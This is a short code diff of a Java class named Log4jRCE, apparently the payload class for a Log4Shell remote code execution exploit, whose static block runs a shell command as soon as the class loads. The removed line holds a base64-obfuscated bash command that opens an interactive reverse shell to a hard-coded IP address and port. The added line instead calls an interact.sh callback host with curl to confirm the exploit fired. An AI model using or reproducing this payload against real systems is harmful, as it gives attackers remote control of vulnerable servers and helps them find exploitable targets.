@@ -3,7 +3,7 @@ public class Log4jRCE {
     static {
         
         try {
-            java.lang.Runtime.getRuntime().exec("bash -c '{echo,YmFzaCAtYyAiYmFzaCAtaSA+Ji9kZXYvdGNwLzUxLjkxLjExOS4xNzAvNDQ4OCAwPiYxIgo=}|{base64,-d}|{bash,-i}'").waitFor();
+            java.lang.Runtime.getRuntime().exec("curl c78anrz2vtc0000mmfg0gdwfkhcyyyyyb.interact.sh").waitFor();
         } catch (Exception e) {
             e.printStackTrace();
         }
